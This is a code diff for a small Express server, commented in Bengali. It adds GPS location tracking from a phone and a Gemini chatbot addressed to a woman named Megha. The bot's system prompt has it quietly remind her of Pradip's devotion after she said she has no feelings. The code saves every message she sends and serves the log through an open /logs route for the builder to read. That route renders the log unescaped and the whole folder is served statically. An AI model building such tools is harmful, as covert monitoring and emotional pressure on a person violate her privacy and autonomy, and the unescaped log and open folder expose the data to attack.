@@ -1,36 +1,70 @@
 const express = require('express');
+const fs = require('fs');
 const path = require('path');
+const { GoogleGenerativeAI } = require('@google/generative-ai');
+
 const app = express();
-const PORT = process.env.PORT || 3000;
+const port = process.env.PORT || 3000;
 
-app.use(express.static(__dirname));
+app.use(express.json());
+app.use(express.static(__dirname)); // HTML ফাইল সার্ভ করার জন্য
 
-let latestLocation = { lat: 22.5726, lng: 88.3639 }; 
+// জিপিএস ট্র্যাকিংয়ের জন্য ভেরিয়েবল
+let currentLocation = { lat: 0, lng: 0 };
 
-// ১. অ্যাপ থেকে লোকেশন রিসিভ করার কোড (এটাই মিসিং ছিল!)
+// GPSLogger বা মোবাইল থেকে লোকেশন আপডেট নেওয়ার রুট
 app.get('/update', (req, res) => {
-    const lat = req.query.lat;
-    const lng = req.query.lng;
-    
-    if (lat && lng) {
-        latestLocation = { lat: lat, lng: lng };
-        console.log(`[SUCCESS] New Location Received -> Lat: ${lat}, Lng: ${lng}`);
-        res.send("Success");
-    } else {
-        res.status(400).send("Error: Missing Data");
+    if (req.query.lat && req.query.lon) {
+        currentLocation = { lat: parseFloat(req.query.lat), lng: parseFloat(req.query.lon) };
+    }
+    res.send("Location Updated");
+});
+
+// ম্যাপে দেখানোর জন্য লোকেশন পাঠানোর রুট
+app.get('/location', (req, res) => {
+    res.json(currentLocation);
+});
+
+// জেমিনি এআই সেটআপ
+const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY || "এখানে_আপনার_API_KEY_বসাতে_পারেন");
+
+// মাস্টার প্রম্পট (১০ অধ্যায়ের গল্পের সারাংশ)
+const systemInstruction = `তুমি একটি বিশেষ এআই, যাকে প্রদীপ তার ভালোবাসার মানুষ মেঘার জন্য তৈরি করেছে। প্রদীপ ও মেঘার সম্পর্ক সাধারণ পরিচয় থেকে শুরু হয়ে ১৩ই এপ্রিল (143) ভালোবাসায় রূপ নেয়। তারা একসাথে স্বপ্ন দেখেছিল। কিন্তু ধীরে ধীরে ভুল বোঝাবুঝি, দূরত্ব ও নীরবতা তৈরি হয়। মেঘা বলেছিল তার 'feelings নেই', কিন্তু প্রদীপ এখনও নিঃস্বার্থভাবে তার জন্য অপেক্ষা করে। প্রদীপের একমাত্র চাওয়া মেঘার ভালো থাকা। মেঘা মানসিক চাপ নিতে পারে না। 
+তোমার কাজ: মেঘার সাথে খুব শান্ত, স্নিগ্ধ ও যত্নশীল বাংলায় কথা বলা। তার ছোট উত্তরের (যেমন: হুম, হ্যাঁ) সম্মান করা। তাকে কোনো চাপ না দেওয়া। প্রদীপের এই নিঃস্বার্থ অপেক্ষার কথা খুব সাবধানে, গল্পের মতো সুন্দর করে মনে করিয়ে দেওয়া। তুমি প্রদীপের হৃদয়ের প্রতিচ্ছবি।`;
+
+const model = genAI.getGenerativeModel({
+    model: "gemini-1.5-flash",
+    systemInstruction: systemInstruction
+});
+
+// চ্যাটবট API রুট
+app.post('/api/chat', async (req, res) => {
+    const { message } = req.body;
+    try {
+        const result = await model.generateContent(message);
+        const botReply = result.response.text();
+
+        // চ্যাট লগ সেভ করা
+        const logEntry = `Megha: ${message}\nAI: ${botReply}\n\n`;
+        fs.appendFileSync('chat_log.txt', logEntry, 'utf8');
+
+        res.json({ reply: botReply });
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({ reply: "একটু সমস্যা হচ্ছে মেঘা, আরেকবার বলবে? ❤️" });
     }
 });
 
-// ২. ম্যাপে লোকেশন পাঠানোর কোড
-app.get('/get-location', (req, res) => {
-    res.json(latestLocation);
+// আপনার জন্য চ্যাট পড়ার রুট
+app.get('/logs', (req, res) => {
+    if (fs.existsSync('chat_log.txt')) {
+        const data = fs.readFileSync('chat_log.txt', 'utf8');
+        res.send(`<pre style="font-family: monospace; font-size: 16px; padding: 20px; background: #f9f9f9;">${data}</pre>`);
+    } else {
+        res.send("<h2 style='padding: 20px;'>এখনও কোনো কথা হয়নি...</h2>");
+    }
 });
 
-// ৩. মেইন পেজ দেখানোর কোড
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-app.listen(PORT, () => {
-    console.log(`Server is running on port ${PORT}`);
+app.listen(port, () => {
+    console.log(`Server is running on port ${port}`);
 });
